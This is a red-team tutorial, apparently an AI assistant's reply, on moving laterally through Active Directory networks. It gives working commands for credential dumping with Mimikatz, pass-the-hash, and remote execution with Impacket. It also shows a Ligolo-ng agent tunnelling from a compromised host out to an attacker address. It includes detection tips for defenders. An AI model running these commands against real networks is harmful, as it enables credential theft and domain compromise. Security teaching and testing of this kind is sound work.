# Lateral Movement in Active Directory (AD) Hacking

Lateral movement means:

> Moving from one compromised machine to other machines inside the same internal network — usually to reach high-value systems like Domain Controllers.

In Microsoft Active Directory environments, lateral movement is one of the most critical phases of an attack.

---

# 🎯 What Is Lateral Movement?

After initial access (e.g., web server, phishing, VPN credential), the attacker:

1. Enumerates the internal network
2. Finds credentials
3. Reuses or escalates privileges
4. Accesses additional systems
5. Eventually targets Domain Controller

---

# 🧠 Why It’s Important in AD

AD environments are based on **trust relationships**.

Example trust chain:

```text
Workstation → File Server → Application Server → Domain Controller
```

If credentials are reused or cached, attackers can move across this chain.

---

# 📊 Typical Enterprise AD Network

```text
Internet
   |
Public Web Server
   |
Internal Network (10.0.0.0/24)
   |
----------------------------------
|         |           |          |
WS01     FILE01      APP01      DC01
10.0.0.5  10.0.0.10   10.0.0.20  10.0.0.100
```

Goal: Reach **DC01**

---

# 🔥 Lateral Movement Process (Step-by-Step)

## 1️⃣ Initial Foothold

Compromise:

* Phishing → workstation
* Exploit → web server
* Weak credentials → VPN

Now attacker is “inside.”

---

## 2️⃣ Internal Enumeration

Discover:

* Domain name
* Domain users
* Admin accounts
* Shares
* Open ports

### Tools

* CrackMapExec
* PowerView
* BloodHound

Example:

```bash
crackmapexec smb 10.0.0.0/24 -u user -p pass
```

PowerView:

```powershell
Get-DomainUser
Get-DomainComputer
```

---

## 3️⃣ Credential Harvesting

Look for:

* LSASS memory
* SAM hashes
* Kerberos tickets
* Cached credentials

### Tools

* Mimikatz
* Rubeus

Example:

```powershell
mimikatz.exe
sekurlsa::logonpasswords
```

---

## 4️⃣ Credential Reuse / Pass-the-Hash

If local admin password is reused:

```bash
crackmapexec smb 10.0.0.20 -u Administrator -H <NTLM_HASH>
```

This is Pass-the-Hash.

---

## 5️⃣ Remote Execution

Once admin access is confirmed:

### Using Impacket

Impacket

```bash
psexec.py domain/user:pass@10.0.0.20
```

or:

```bash
wmiexec.py domain/user:pass@10.0.0.20
```

---

# 🔬 Common Lateral Movement Techniques in AD

| Technique       | Description              |
| --------------- | ------------------------ |
| SMB / PsExec    | Remote service creation  |
| WMI             | Remote command execution |
| WinRM           | PowerShell remoting      |
| RDP             | Interactive login        |
| Pass-the-Hash   | NTLM hash reuse          |
| Pass-the-Ticket | Kerberos ticket reuse    |

---

# 🧨 Realistic Scenario

### Scenario: Helpdesk Account Compromised

You compromise:

```
WS01 (10.0.0.5)
```

You dump credentials.

You find:

```
ITAdmin logged into FILE01 recently
```

You dump LSASS → extract ITAdmin hash.

Use:

```bash
psexec.py domain/ITAdmin@10.0.0.10 -hashes :NTLMHASH
```

You now own FILE01.

From FILE01, you find Domain Admin session → escalate → DC compromise.

---

# 🧠 BloodHound Example

BloodHound maps relationships.

It shows:

```
UserA → Local Admin on Server01
Server01 → Admin logged in
Admin → Member of Domain Admins
```

That’s your lateral movement path.

---

# 🚀 Ligolo-ng (Advanced Pivoting for Lateral Movement)

Ligolo-ng is modern and stealthier than SSH tunnels.

It creates a TUN interface to pivot full network traffic.

---

## 🔹 Why Ligolo-ng Is Powerful

* No SOCKS needed
* Native routing
* Fast
* Works well in segmented networks
* Useful when SMB blocked externally

---

## 🔹 Setup Example

### On Attacker Machine

```bash
ligolo-ng proxy -selfcert
```

---

### On Compromised Machine

```bash
ligolo-ng agent -connect attacker_ip:11601 -ignore-cert
```

---

### Create Tunnel

In Ligolo console:

```bash
session
start
```

Add route:

```bash
ip route add 10.0.0.0/24 dev ligolo
```

Now you can:

```bash
nmap 10.0.0.10
crackmapexec smb 10.0.0.20
```

Direct access to internal subnet.

---

# 🔥 Scenario Using Ligolo-ng

1. You compromise WebServer (DMZ).
2. It can reach 10.10.10.0/24.
3. Deploy Ligolo agent.
4. Route internal subnet.
5. Run:

```bash
nmap -sT 10.10.10.0/24
```

You now scan internal AD network from outside.

---

# 🛡 Blue Team Perspective

Detect:

* Unusual SMB authentication bursts
* Lateral logons (Event ID 4624 type 3)
* LSASS memory access
* Remote service creation
* Kerberos anomalies

Tools:

* Microsoft Defender for Identity
* Splunk
* Sysmon

---

# 🧠 Full Lateral Movement Flow (Red Team View)

1. Initial foothold
2. Internal enumeration
3. Credential dump
4. Privilege escalation
5. Remote execution
6. Pivot to next subnet
7. Repeat
8. Domain Controller compromise

---

# 🎯 End Goal in AD

Usually:

* Dump NTDS.dit
* Extract KRBTGT hash
* Create Golden Ticket
* Persistence

---

# ⚠ Ethical Reminder

Everything discussed:

* Legal only in lab
* Legal with written authorization
* Illegal otherwise

---

If you want, next I can explain:

* 🔬 How Domain Controllers are finally compromised
* 🧠 Golden Ticket & persistence
* 🛡 How to defend against lateral movement
* 📊 Step-by-step lab walkthrough

Tell me your level (beginner / intermediate / advanced).
